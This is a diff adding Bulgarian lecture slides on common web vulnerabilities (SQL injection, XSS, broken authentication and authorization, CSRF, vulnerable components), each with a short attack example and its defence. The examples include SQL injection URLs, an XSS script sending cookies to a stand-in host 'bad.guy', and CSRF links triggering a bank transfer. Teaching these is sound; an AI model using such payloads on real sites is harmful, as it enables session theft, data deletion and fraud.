@@ -96,7 +96,7 @@
                                                 <p class="fragment">
                                                         Ще обърнем внимание основно на приложния и представителния слой
                                                 </p>
-                                        </section>                                        
+                                        </section>
                                 </section>
                                 <section>
                                         <section>
@@ -145,27 +145,97 @@
                                         </section>
                                         <section>
                                                 <h2>Инжектиране на команди (Injection)</h2>
-                                                <p>TODO</p>
+                                                <ul>
+                                                        <li><strong>Уязвимост:</strong> очакват се данни, които да бъдат попълнени като параметри в команда</li>
+                                                        <li><strong>Атака:</strong> в данните могат да се съдържат специални символи, които да се интерпретират като част от командата и да се промени нейното действие</li>
+                                                        <li><strong>Пример (SQL injection):</strong><br>
+                                                                <pre><code class="hljs" data-trim>
+                                                                                query = "SELECT * FROM users WHERE id = " + id;
+
+                                                                                https://example.com/profile.php?id=2 OR 1=1
+                                                                                https://example.com/profile.php?id=2; -- DELETE FROM users
+                                                                </code></pre>
+                                                        </li>
+                                                        <li><strong>Защита:</strong> премахване или маскиране на специални символи, параметризирани заявки</li>
+                                                </ul>
                                         </section>
                                         <section>
                                                 <h2>Cross-site scripting (XSS)</h2>
-                                                <p>TODO</p>
+                                                <ul>
+                                                        <li><strong>Уязвимост:</strong> уеб страница визуализира данни, въведени от потребителя или подадени от браузъра, директно в HTML кода</li>
+
+                                                        <li><strong>Атака:</strong> в данните може да се сложи JavaScript, който да се изпълнява от името на потребителя и сайта</li>
+                                                        <li><strong>Пример:</strong><br>
+                                                                <pre><code class="hlphp" data-trim>
+                                                                                &lt;p&gt;Коментар:&lt;br&gt;&lt;?= $userComment ?&gt;&lt;/p&gt;
+
+                                                                                &lt;script&gt;window.location="http://bad.guy/?cookie=" + document.cookie&lt;/script&gt;
+                                                                                &lt;img src="logo.png" onload="var xhr=new XMLHttpRequest();\
+                                                                                xhr.open('GET', '/authService/user/delete?name=bob', true);xhr.send();"/&gt;
+                                                                </code></pre>
+                                                        </li>
+                                                        <li><strong>Защита:</strong> маскиране на специалните символи, Content-Security-Policy (CSP)</li>
+                                                </ul>
                                         </section>
                                         <section>
                                                 <h2>Проблеми с удостоверяването (authentication)</h2>
-                                                <p>TODO</p>
+                                                <ul>
+                                                        <li><strong>Уязвимост:</strong> логически пропуск при проверка за удостоверяване на потребител</li>
+                                                        <li><strong>Атака:</strong> създаване на специална заявка, която да се възползва от логическия пропуск така, че сървърът да ни разпознае като друг потребител</li>
+                                                        <li><strong>Пример:</strong><br>
+                                                                <pre><code class="hljs" data-trim>
+                                                                                logged = true;
+                                                                                if (password == null || hash(password) != correctHash)
+                                                                                	logged = false;
+                                                                </code></pre>
+                                                        </li>
+                                                        <li><strong>Защита:</strong> използване на стандартен компонент за управление на сесии</li>
+                                                </ul>
                                         </section>
                                         <section>
                                                 <h2>Проблеми с упълномощяването (authorization)</h2>
-                                                <p>TODO</p>
+                                                <ul>
+                                                        <li><strong>Уязвимост:</strong> логически пропуск при проверка дали потребител има право да достъпи дадена страница</li>
+                                                        <li><strong>Атака:</strong> модифициране на стандартна заявка, така че да извършваме действия, за които не би трябвало да изпълним през потребителския интерфейс</li>
+                                                        <li><strong>Пример:</strong><br>
+                                                                <pre><code class="hljs" data-trim>
+                                                                                http://example.com/edit-profile
+                                                                                http://example.com/edit-profile?username=admin
+                                                                </code></pre>
+                                                        </li>
+                                                        <li><strong>Защита:</strong> отказ на достъп по подразбиране, валидиране на бисквитка или жетон (token) при всяка заявка</li>
+                                                </ul>
                                         </section>
                                         <section>
                                                 <h2>Подправяне на заявки<br>(Cross-Site Request Forgery &mdash; CSRF)</h2>
-                                                <p>TODO</p>
+                                                <ul>
+                                                        <li><strong>Уязвимост:</strong> обработка на заявка с неясен произход</li>
+                                                        <li><strong>Атака:</strong> подвеждане на браузъра на потребителя да генерира заявка от негово име към сайт, в който се е удостоверил</li>
+                                                        <li><strong>Пример:</strong><br>
+                                                                <pre><code class="hlhtml" data-trim>
+                                                                                Hi! You have won $1,000,000!
+                                                                                Click &lt;a href="https://lame.bank/send?to=BADGUY&sum=10000"&gt;here&lt;/a&gt;
+                                                                                to claim your prize!
+
+                                                                                &lt;img src="https://lame.bank/send?to=BADGUY&sum=10000" width="0" height="0"/&gt;
+                                                                </code></pre>
+                                                        </li>
+                                                        <li><strong>Защита:</strong> валидиране на жетон (token) при всяка заявка, използване на съвременна рамка за приложения</li>
+                                                </ul>
                                         </section>
                                         <section>
                                                 <h2>Използване на уязвими компоненти</h2>
-                                                <p>TODO</p>
+                                                <ul>
+                                                        <li><strong>Уязвимост:</strong> стандартен компонент с отворен код има известна уязвимост</li>
+                                                        <li><strong>Атака:</strong> изпълнявне на библиотека от стандартни атаки срещу всички потенциално уязвими компоненти на сайта</li>
+                                                        <li><strong>Пример:</strong>
+                                                                <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-5638">CVE-2017-5638</a>
+                                                                <blockquote style="font-size: .6em">
+                                                                        The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 has incorrect exception handling and error-message generation during file-upload attempts, which allows remote attackers to execute arbitrary commands via a crafted Content-Type, Content-Disposition, or Content-Length HTTP header.
+                                                                </blockquote>
+                                                        </li>
+                                                        <li><strong>Защита:</strong> внимателно подбиране на компоненти за вграждане (поддържани ли са, от сигурен източник ли са), следене за обновления по сигурността</li>
+                                                </ul>
                                         </section>
                                 </section>
                                 <section>
@@ -183,7 +253,7 @@
                                         <section>
                                                 <h2>Основни команди на Docker</h2>
                                                 <p>TODO</p>
-                                        </section>                                       
+                                        </section>
                                         <section>
                                                 <h2>Построяване на образи (images)</h2>
                                                 <p>Dockerfile TODO</p>
